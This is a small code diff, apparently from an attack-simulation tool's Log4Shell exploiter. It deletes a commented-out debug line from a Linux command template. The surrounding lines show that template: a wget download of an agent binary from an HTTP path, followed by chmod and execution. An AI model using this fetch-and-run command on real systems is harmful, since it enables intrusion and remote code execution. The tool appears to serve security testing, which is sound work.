@@ -64,7 +64,6 @@ LOG4SHELL_LINUX_COMMAND = (
     "wget -O %(monkey_path)s %(http_path)s ;"
     " chmod +x %(monkey_path)s ;"
     " %(monkey_path)s %(monkey_type)s %(parameters)s"
-    # "touch /tmp/test_with_new"
 )
 
 LOG4SHELL_WINDOWS_COMMAND = (
